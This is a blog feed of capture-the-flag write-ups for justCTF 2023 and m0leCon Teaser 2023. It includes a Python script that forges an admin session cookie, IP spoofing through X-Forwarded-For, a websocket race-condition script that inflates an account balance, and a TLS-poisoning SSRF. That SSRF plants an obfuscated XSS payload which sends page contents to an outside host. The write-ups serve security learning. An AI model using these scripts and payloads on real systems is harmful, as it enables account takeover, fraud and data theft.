<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://www.cjxol.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.cjxol.com/" rel="alternate" type="text/html" /><updated>2023-06-06T00:30:04+01:00</updated><id>https://www.cjxol.com/feed.xml</id><title type="html">cjxol.com</title><entry><title type="html">justCTF 2023 Dangerous (Web) Writeup</title><link href="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/" rel="alternate" type="text/html" title="justCTF 2023 Dangerous (Web) Writeup" /><published>2023-06-05T00:00:00+01:00</published><updated>2023-06-05T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/justctf-2023-web-dangerous-writeup/"><![CDATA[<p><a href="https://2023.justctf.team/challenges/18">justCTF 2023 Dangerous (Web)</a><br />
<a href="https://ctftime.org/event/1930">Event on CTFtime</a></p>

<h2 id="challenge-description">Challenge Description</h2>

<blockquote>
  <p>My friend told me there’s a secret page on this forum, but it’s only for administrators.</p>
</blockquote>

<p>A link to the challenge and downloadable of the source code are provided.</p>

<h2 id="a-first-look">A First Look</h2>

<p>The web app is a forum, with two threads posted.</p>

<p><img src="/assets/image/justctf-2023-web-dangerous-writeup/homepage.png" alt="Homepage" /></p>

<p>Viewing one of the threads, it can be seen that the username of admin is <code class="highlighter-rouge">janitor</code>.</p>

<p><img src="/assets/image/justctf-2023-web-dangerous-writeup/thread-1.png" alt="Thread 1" /></p>

<p>The web app is written in Ruby.</p>

<p>The <code class="highlighter-rouge">/flag</code> endpoint and <code class="highlighter-rouge">is_llowed_ip</code> function is especially interesting:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">get</span> <span class="s2">"/flag"</span> <span class="k">do</span>
  <span class="k">if</span> <span class="o">!</span><span class="n">session</span><span class="p">[</span><span class="ss">:username</span><span class="p">]</span> <span class="k">then</span>
    <span class="n">erb</span> <span class="ss">:login</span>
  <span class="k">elsif</span> <span class="o">!</span><span class="n">is_allowed_ip</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="ss">:username</span><span class="p">],</span> <span class="n">request</span><span class="p">.</span><span class="nf">ip</span><span class="p">,</span> <span class="n">config</span><span class="p">)</span> <span class="k">then</span>
    <span class="k">return</span> <span class="p">[</span><span class="mi">403</span><span class="p">,</span> <span class="s2">"You are connecting from untrusted IP!"</span><span class="p">]</span>
  <span class="k">else</span>
    <span class="k">return</span> <span class="n">config</span><span class="p">[</span><span class="s2">"flag"</span><span class="p">]</span> 
  <span class="k">end</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">is_allowed_ip</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">config</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">config</span><span class="p">[</span><span class="s2">"mods"</span><span class="p">].</span><span class="nf">any?</span> <span class="p">{</span>
    <span class="o">|</span><span class="n">mod</span><span class="o">|</span> <span class="n">mod</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">==</span> <span class="n">username</span> <span class="n">and</span> <span class="n">mod</span><span class="p">[</span><span class="s2">"allowed_ip"</span><span class="p">]</span> <span class="o">==</span> <span class="n">ip</span>
  <span class="p">}</span>
<span class="k">end</span>
</code></pre></div></div>

<p>It checks the if the user logged in is a moderator and if the IP address is the allowed IP address in a config file.</p>

<h2 id="craft-admin-cookie">Craft Admin Cookie</h2>

<p>When clicking on “New Thread” without filling in anything, the website shows an error page with backtrace and environment information. The session secret as well as how the session cookie is encoded is revealed.</p>

<p><img src="/assets/image/justctf-2023-web-dangerous-writeup/session-options.png" alt="Session options" /></p>

<p>The session is implemented with Rack Protection. With some research into the <a href="https://github.com/sinatra/sinatra/blob/5f4dde19719505989905782a61a19c545df7f9f9/rack-protection/lib/rack/protection/encryptor.rb#L19">source code</a>, and from environment info, it can be seen that the session cookie is encoded and encrypted as follows:</p>

<ol>
  <li>The data is first serialised with Marshal</li>
  <li>It is then encrypted with AES-256-GCM with the first 32 bytes of the session secret as the key</li>
  <li>The encrypted data, IV and authentication tag are then encoded with URL-safe base64</li>
  <li>The encrypted data, IV and authentication tag are then concatenated with a <code class="highlighter-rouge">--</code> delimiter</li>
</ol>

<p>My script to modify the session cookie into an admin cookie is as follows:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>
<span class="kn">import</span> <span class="nn">rubymarshal.reader</span><span class="p">,</span> <span class="n">rubymarshal</span><span class="p">.</span><span class="n">writer</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="n">secret</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">'[secret hex string]'</span><span class="p">)</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="s">'[original cookie]'</span>
<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'--'</span><span class="p">)</span>
<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">secret</span><span class="p">[:</span><span class="mi">32</span><span class="p">],</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">dec</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">rubymarshal</span><span class="p">.</span><span class="n">reader</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">dec</span><span class="p">)</span>

<span class="n">d</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'janitor'</span>
<span class="n">m</span> <span class="o">=</span> <span class="n">rubymarshal</span><span class="p">.</span><span class="n">writer</span><span class="p">.</span><span class="n">writes</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">secret</span><span class="p">[:</span><span class="mi">32</span><span class="p">],</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>  <span class="c1"># I just reuse the original IV
</span><span class="n">ct</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt_and_digest</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
<span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span> <span class="o">=</span> <span class="nb">map</span><span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote</span><span class="p">,</span> <span class="p">[</span><span class="n">ct</span><span class="p">,</span> <span class="n">iv</span><span class="p">,</span> <span class="n">auth</span><span class="p">])</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">ct</span><span class="si">}</span><span class="s">--</span><span class="si">{</span><span class="n">iv</span><span class="si">}</span><span class="s">--</span><span class="si">{</span><span class="n">auth</span><span class="si">}</span><span class="s">'</span>
<span class="k">print</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="bypass-ip-restriction">Bypass IP Restriction</h2>

<p>With the admin cookie, the <code class="highlighter-rouge">/flag</code> endpoint now does not prompt to login, but instead shows a 403 error page with message “You are connecting from untrusted IP!”.</p>

<h3 id="spoof-the-ip-address">Spoof the IP Address</h3>

<p>In <code class="highlighter-rouge">nginx.conf</code>, it can be seen that the <code class="highlighter-rouge">REMOTE_ADDR</code> header is set to localhost with the following:</p>

<div class="language-nginx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">proxy_set_header</span> <span class="s">REMOTE_ADDR</span> <span class="s">localhost</span><span class="p">;</span>
</code></pre></div></div>

<p>Research on how the app gets <code class="highlighter-rouge">request.ip</code>, found in this <a href="https://stackoverflow.com/a/43014286">Stack Overflow answer</a>, that if the <code class="highlighter-rouge">REMOTE_ADDR</code> is in reserved private subnet ranges, it will instead use the <code class="highlighter-rouge">X-Forwarded-For</code> header, thus the IP address can be spoofed with <code class="highlighter-rouge">X-Forwarded-For</code>.</p>

<h3 id="find-the-allowed-ip-address">Find the Allowed IP Address</h3>

<p>However, the allowed IP address is still unknown. Looking at the source code, the user colour uses in each thread uses the first 6 characters of the hex value of SHA-256 of the IP address and thread ID concatenated together.</p>

<div class="language-erb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;%</span> <span class="n">user_color</span> <span class="o">=</span> <span class="no">Digest</span><span class="o">::</span><span class="no">SHA256</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">(</span><span class="n">reply</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="vi">@id</span><span class="p">).</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="cp">%&gt;</span>
</code></pre></div></div>

<p>In the above code, <code class="highlighter-rouge">reply[2]</code> is the IP address of the user who posted the reply, and <code class="highlighter-rouge">@id</code> is the thread ID.</p>

<p>Both of thread 1 and thread 2 have a reply from the admin, so the IP address can be found by brute forcing to find the IP address that produces the matching hashes for both threads.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Pool</span>
<span class="n">target</span> <span class="o">=</span> <span class="s">'32cae2'</span>
<span class="n">thread</span> <span class="o">=</span> <span class="mi">1</span>
<span class="k">def</span> <span class="nf">brute</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
                <span class="n">ip</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">d</span><span class="si">}</span><span class="s">'</span>
                <span class="n">x</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>
                <span class="n">h</span> <span class="o">=</span> <span class="n">SHA256</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">h</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
                    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">d</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">with</span> <span class="n">Pool</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
        <span class="n">p</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">brute</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
</code></pre></div></div>

<p>Putting everything together, the flag is:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>justCTF{1_th1nk_4l1ce_R4bb1t_m1ght_4_4_d0g}
</code></pre></div></div>

<h2 id="additional-notes">Additional Notes</h2>

<p>Rack Protection tracks user agent, and if the user agent is changed, the session cookie will be invalidated. Either the user agent must be spoofed, or the session cookie must be regenerated.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[justCTF 2023 Dangerous (Web) Event on CTFtime]]></summary></entry><entry><title type="html">m0leCon Teaser 2023 Writeup</title><link href="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/" rel="alternate" type="text/html" title="m0leCon Teaser 2023 Writeup" /><published>2023-05-16T00:00:00+01:00</published><updated>2023-05-16T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/m0lecon-teaser-2023-writeup/"><![CDATA[<p><a href="https://ctf.m0lecon.it/">m0leCon Teaser 2023</a><br />
<a href="https://ctftime.org/event/1898">On CTFtime</a></p>

<p>Overall good CTF with challenging original fun challenges.</p>

<p>On this page:</p>

<ul>
  <li><a href="#goldinospizza2">goldinospizza2</a> - Web, websocket API, exploit race condition</li>
  <li><a href="#print-template-2">Print template 2</a> - SSRF via TLS poisoning to request Memcached. I did not solve this challenge, did the writeup based on discussions.</li>
</ul>

<h2 id="goldinospizza2">goldinospizza2</h2>

<p>The challenge was released at about 2:40 AM BST as the “<a href="https://discord.com/channels/1100159162794655904/1100159163096633447/1106757967291879506"><del>patched</del> <em>improved</em> version of <code class="highlighter-rouge">goldinospizza</code></a>”, which was about over 8 hours into the CTF. It was just before I was planning to go to bed, but the challenge looked solvable😅.</p>

<p>The challenge was a web challenge with a website that allowed you to order pizza with a registered account. Most of the pizzas’ prices were ranging between 6 and 15, but there was one pizza named “The flagship of pizzas” that costs 1,000,000. The flag will be shown if this pizza is successfully ordered. The initial account balance is 30.</p>

<p>Looking through the code, there are two websocket API functions that are interesting, one is <code class="highlighter-rouge">order</code>, and another one is <code class="highlighter-rouge">cancel</code>. The <code class="highlighter-rouge">order</code> function is used to order a pizza, and the <code class="highlighter-rouge">cancel</code> function is used to cancel an order and get refund.</p>

<p>The <code class="highlighter-rouge">order</code> function is implemented as follows:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">order</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">ws</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="c1"># Some checks on input omitted
</span>    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="s">"orders"</span><span class="p">]:</span>
        <span class="c1"># Some checks on input omitted
</span>        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">item</span><span class="p">[</span><span class="s">"quantity"</span><span class="p">])</span> <span class="ow">is</span> <span class="ow">not</span> <span class="nb">int</span><span class="p">:</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"ONE OF YOUR 🍕 'quantity' IS NOT INT"</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">item</span><span class="p">[</span><span class="s">"quantity"</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"ONE OF YOUR 🍕 'quantity' IS NOT VALID"</span><span class="p">)</span>
        <span class="n">product</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">db</span><span class="p">.</span><span class="n">select</span><span class="p">(</span><span class="n">Product</span><span class="p">).</span><span class="nb">filter</span><span class="p">(</span>
            <span class="n">Product</span><span class="p">.</span><span class="nb">id</span> <span class="o">==</span> <span class="n">item</span><span class="p">[</span><span class="s">"product"</span><span class="p">])).</span><span class="n">scalars</span><span class="p">().</span><span class="n">one_or_none</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">product</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"WE DON'T SELL THAT 🍕"</span><span class="p">)</span>
        <span class="n">quantity</span> <span class="o">=</span> <span class="n">item</span><span class="p">[</span><span class="s">"quantity"</span><span class="p">]</span>
        <span class="n">current_user</span><span class="p">.</span><span class="n">balance</span> <span class="o">-=</span> <span class="n">product</span><span class="p">.</span><span class="n">price</span> <span class="o">*</span> <span class="n">quantity</span>
        <span class="k">if</span> <span class="n">current_user</span><span class="p">.</span><span class="n">balance</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">rollback</span><span class="p">()</span>
            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">"NO 🍕 STEALING ALLOWED!"</span><span class="p">)</span>
        <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">Order</span><span class="p">(</span>
            <span class="n">user_id</span><span class="o">=</span><span class="n">current_user</span><span class="p">.</span><span class="nb">id</span><span class="p">,</span>
            <span class="n">product_id</span><span class="o">=</span><span class="n">product</span><span class="p">.</span><span class="nb">id</span><span class="p">,</span>
            <span class="n">product_quantity</span><span class="o">=</span><span class="n">quantity</span><span class="p">,</span>
            <span class="n">product_price</span><span class="o">=</span><span class="n">product</span><span class="p">.</span><span class="n">price</span>
        <span class="p">))</span>
        <span class="k">if</span> <span class="n">product</span><span class="p">.</span><span class="nb">id</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">quantity</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span>
                <span class="sa">f</span><span class="s">"WOW you are SO rich! Here's a little extra with your golden special 🍕: </span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">[</span><span class="s">'FLAG'</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">current_user</span><span class="p">)</span>
    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s">"orders"</span><span class="p">]),</span> <span class="p">{</span><span class="s">"ok"</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span> <span class="s">"balance"</span><span class="p">:</span> <span class="n">current_user</span><span class="p">.</span><span class="n">balance</span><span class="p">,</span> <span class="s">"orders"</span><span class="p">:</span> <span class="n">_orders</span><span class="p">()}</span>
</code></pre></div></div>

<p>In the code, I identified that there is a race condition that can be exploited to make total order larger than we have in the balance, and cancel the order to refund so we can have more balanced than we started with.</p>

<p>We can blast with multiple websocket requests to make order, and if the previous order has not been committed to the database, the next request is still checked against the old balance.</p>

<p>To make programming easier, I did scripting within the browser console within the context of the website. After some initial test, my balance increased to 66.00 from the initial 30.00.</p>

<p><img src="/assets/image/m0lecon-teaser-2023-writeup/pizza-balance.png" alt="Balance increased to 66.00" /></p>

<p>The script I used to blast the order is as follows:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">request</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">order</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">orders</span><span class="dl">"</span><span class="p">:</span> <span class="p">[{</span>
        <span class="dl">"</span><span class="s2">product</span><span class="dl">"</span><span class="p">:</span> <span class="mi">19</span><span class="p">,</span>
        <span class="dl">"</span><span class="s2">quantity</span><span class="dl">"</span><span class="p">:</span> <span class="mi">9792</span><span class="p">,</span>
    <span class="p">},</span> <span class="p">],</span>
<span class="p">}</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="s2">`wss://goldinospizza2.challs.m0lecon.it/sock`</span><span class="p">);</span>
    <span class="nx">ws</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">open</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">message</span><span class="p">))</span>
    <span class="p">})</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The connection will get killed after some numbers of requests. To scale this up, when I repeated the process, I increased the quantity of each of the order to the amount that I can afford with the balance. Then my available balance increased increases exponentially.</p>

<p>With enough balance, order the golden “The flagship of pizzas”, get the flag and submitted at 4:00 AM BST. Enjoy the 🍕:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ptm{https://youtu.be/Uzryuem5NDc lets make pizza greater than zero again https://www.giallozafferano.com/recipes/Pizza-Margherita.html}
</code></pre></div></div>

<p>The author has <a href="https://discord.com/channels/1100159162794655904/1100159163096633453/1108006782871285770">a different solution</a> to desync the balance in the session and the database, with multiple order/cancel requests can be sent in one websocket request, and how the order/cancel is handled.</p>

<h2 id="print-template-2">Print template 2</h2>

<p>A challenge with a web app under the misc category. IIRC the challenge was released after a while since the CTF started. It was a hard challenge, with team “organizers” first blooded it at 6:06 AM BST, and team “Kalmarunionen” submitted the flag half an hour before the CTF ends. I was not able to solve it myself. This writeup follows <a href="https://sam.ninja/">Sam.ninja</a> and <a href="https://twitter.com/pilvar222">pilvar</a>’s solution and payloads, which appears to be the <a href="https://discord.com/channels/1100159162794655904/1100159163096633453/1106990892780359771" title="Just link to a Discord message that one of the challenge author Xato confirms it is the intended solution">intended solution</a>.</p>

<p>The webapp lets user import templates and “print” them by substitute the place holders in the template with data, and download the print.</p>

<p><img src="/assets/image/m0lecon-teaser-2023-writeup/import-template.png" alt="Import template" /></p>

<p>The user can also submit a “premium request” for review, which will be reviewed by the admin bot. Part of the template which renders the bot will visit is as follows:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">data:image/png;base64,&lt;%=</span> <span class="na">request.img</span> <span class="err">%</span><span class="nt">&gt;</span>&gt;
<span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"my-3"</span><span class="nt">&gt;&lt;</span><span class="err">%=</span> <span class="na">request.msg</span> <span class="err">%</span><span class="nt">&gt;&lt;/p&gt;</span>
</code></pre></div></div>

<p>As with <code class="highlighter-rouge">&lt;%=</code> tag in EJS, the output will be HTML escaped, so it is not possible to inject script with <code class="highlighter-rouge">msg</code>, however it is possible to inject script in the <code class="highlighter-rouge">img</code> tag with <code class="highlighter-rouge">onerror</code> attribute.</p>

<p>On the web server, the file uploaded will be encoded in base64 and stored in memcached as the <code class="highlighter-rouge">img</code> value being used when rendering the template. With it rendered into base64, it is not possible to inject script into the <code class="highlighter-rouge">img</code> tag. However, if it is possible to control the content stored into memcached, it is possible to inject script into the <code class="highlighter-rouge">img</code> tag.</p>

<h3 id="ssrf-via-tls-poisoning">SSRF via TLS Poisoning</h3>

<p>We cannot make request from our machine directly, we will need to leverage SSRF to make request to memcached.</p>

<p>The “import template” function allows us to import template from a URL. The URL can be a http or https URL, and the server will make the request. The SSRF is exploited via TLS session resumption by injecting payload into session ID. As memcached commands are newline terminated and invalid input will be skipped, it is possible to inject command with new lines. <a href="https://github.com/jmdx/TLS-poison">This TLS Poison PoC</a> is used to implement the exploit. More details about the exploit can be found in <a href="https://youtube.com/watch?v=qGpAJxfADjo">the presentation at DEF CON Safe Mode</a>.</p>

<p>With some modification to the PoC, a customised TLS server and DNS server for DNS rebinding is set up. Make HTTPS request to the TLS server, the TLS server will response a redirect with the TLS session ID being the payload. The client will be repeatedly redirected to the TLS server until the client makes another request to the DNS server, which will resolve to the target IP. As the TLS session ID is keyed by the hostname and port but not IP address, the session ID is reused for the request to the target IP. The request will be made to the target IP with the payload in the session ID.</p>

<p>It is shown in the image below that the payload is in the request made by the curl client to the localhost target.</p>

<p><img src="/assets/image/m0lecon-teaser-2023-writeup/tls-poisoning.png" alt="TLS Poisoning" /></p>

<h3 id="send-payload-into-memcached">Send Payload into Memcached</h3>

<p>When request the bot to review, the bot will visit every unvisited requests by the user where an UUID is generated and saved when the request is submitted. The UUID is also used as the key to store the request in memcached. However, the UUID is not revealed to the user. The UUID is generated with <code class="highlighter-rouge">Math.random</code>. The user IDs are also UUIDs generated with the same library, with knowing enough sequentially generated user IDs, it is possible to predict the future UUIDs.</p>

<p>In this writeup, I skipped the steps bruteforcing for the UUIDs, and just use the UUIDs that is printed to console when the request is submitted and the server generates it.</p>

<p>The script the bot executes is as follows:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span><span class="o">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span><span class="o">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/h3&gt;</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">trim</span><span class="p">())</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span><span class="o">=&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://x.cjxol.com/</span><span class="dl">"</span><span class="o">+</span><span class="nx">x</span><span class="p">))</span>
</code></pre></div></div>

<p>The final payload for TLS session ID becomes the following:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set message_cd330b28-93e9-4524-a70b-d1a03fac941c 0 0 434
{"msg":"whatever","img":"a id=deny onerror=eval(String.fromCharCode(102,101,116,99,104,40,34,47,34,41,46,116,104,101,110,40,120,61,62,120,46,116,101,120,116,40,41,41,46,116,104,101,110,40,120,61,62,120,46,115,112,108,105,116,40,34,60,47,104,51,62,34,41,91,49,93,46,116,114,105,109,40,41,41,46,116,104,101,110,40,120,61,62,102,101,116,99,104,40,34,104,116,116,112,58,47,47,120,46,99,106,120,111,108,46,99,111,109,47,34,43,120,41,41))"}
set message_cd330b28-93e9-4524-a70b-d1a03fac941c 0 0 434
